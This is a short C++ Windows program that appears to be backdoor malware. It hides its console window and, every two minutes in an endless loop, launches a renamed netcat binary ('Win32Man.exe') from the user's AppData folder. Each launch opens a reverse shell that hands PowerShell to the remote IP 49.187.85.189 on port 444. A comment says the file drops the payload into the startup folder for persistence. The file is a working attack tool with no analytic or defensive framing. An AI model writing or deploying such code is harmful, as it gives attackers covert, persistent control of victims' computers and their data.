// this file dropps the payload into the startup folder
#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <Lmcons.h>

int main()
{
  // hide window
	ShowWindow(GetConsoleWindow(), SW_HIDE);

  // getting the ncat path in string
	TCHAR username [ UNLEN + 1 ];
	DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)username, &size);

  std::string ncCommand = "C:\\Users\\";
	ncCommand += username;
	ncCommand += "\\AppData\\Local\\Win32Man.exe 49.187.85.189 444 -e powershell.exe";

  STARTUPINFO info={sizeof(info)};
  PROCESS_INFORMATION processInfo;

  while(1)
  {
    Sleep(120000);

    CreateProcess(NULL, LPSTR(ncCommand.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
    WaitForSingleObject(processInfo.hProcess, INFINITE);

    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);
  }
}
